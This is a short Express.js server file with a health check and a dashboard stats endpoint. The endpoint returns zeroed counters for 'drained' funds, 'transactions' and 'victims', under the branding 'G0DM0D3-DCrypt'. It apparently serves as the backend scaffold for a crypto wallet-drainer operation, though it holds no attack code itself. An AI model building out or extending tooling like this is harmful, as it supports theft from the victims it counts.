const express = require('express');
const app = express();
const PORT = process.env.PORT || 3003;

app.use(express.json());

app.get('/health', (req, res) => {
  res.json({
    status: 'healthy',
    timestamp: new Date().toISOString(),
    version: '3.0.0'
  });
});

app.get('/api/dashboard/stats', (req, res) => {
  res.json({
    total: {
      drained: 0,
      transactions: 0,
      victims: 0
    },
    daily: {
      drained: 0,
      transactions: 0
    }
  });
});

app.listen(PORT, () => {
  console.log(`🚀 G0DM0D3-DCrypt Backend Server v3.0 running on port ${PORT}`);
  console.log(`❤️  Health check: http://localhost:${PORT}/health`);
});